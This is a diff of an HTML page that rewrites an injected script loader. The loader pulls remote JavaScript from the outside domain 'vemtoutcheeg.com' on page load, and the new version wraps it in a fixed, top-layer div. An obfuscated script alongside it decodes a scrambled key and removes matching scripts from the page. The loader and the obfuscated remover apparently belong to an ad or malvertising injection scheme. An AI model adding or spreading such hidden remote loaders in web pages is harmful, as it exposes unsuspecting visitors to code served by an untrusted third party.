@@ -477,7 +477,35 @@
     }
     </script>
   </head>
-  <script>(function(d,z,s){s.src='https://'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('vemtoutcheeg.com',9327749,document.createElement('script'))</script>
+  <script>
+    (function(d,z,s){
+      // Create a wrapper div for positioning
+      var wrapper = document.createElement('div');
+      wrapper.style.position = 'fixed';
+      wrapper.style.bottom = '20px';  // Position at bottom 
+      wrapper.style.left = '20px';    // Position at left
+      wrapper.style.zIndex = '9999';  // Ensure it stays on top
+      
+      // Create the script as before
+      s.src='https://'+d+'/400/'+z;
+      
+      // First append the script to the wrapper
+      wrapper.appendChild(s);
+      
+      // Then append the wrapper to the document
+      try{
+        (document.body||document.documentElement).appendChild(wrapper);
+      }catch(e){}
+      
+      // Add event listener to reposition after content is loaded
+      window.addEventListener('load', function() {
+        if (wrapper) {
+          wrapper.style.bottom = '20px';
+          wrapper.style.left = '20px';
+        }
+      });
+    })('vemtoutcheeg.com',9327749,document.createElement('script'));
+  </script>
   <script data-cfasync="false" type="text/javascript">(()=>{var K='ChmaorrCfozdgenziMrattShzzyrtarnedpoomrzPteonSitfreidnzgtzcseljibcOezzerlebpalraucgeizfznfoocrzEwaocdhnziaWptpnleytzngoectzzdclriehaCtdenTeepxptaNzoldmetzhRzeegvEoxmpezraztdolbizhXCGtIs=rzicfozn>ceamtazr(fdio/c<u>m"eennto)nz:gyzaclaplslizdl"o=ceallySttso r"akgneazl_bd:attuaozbsae"t=Ictresm zegmeatrIftie<mzzLrMeTmHorveenIntiezmezdcolNeeanrozldcezcdoadeehUzReIdCooNmtpnoenreanptzzebnionndzzybatlopasziedvzaellzyJtSsOzNez'
 ;for(let z of document.querySelectorAll('script')){if(z.innerHTML.includes(K.replace(/zz/g,'').replace(/zr/g,''))){z.remove();break}}})();</script>
   <body>
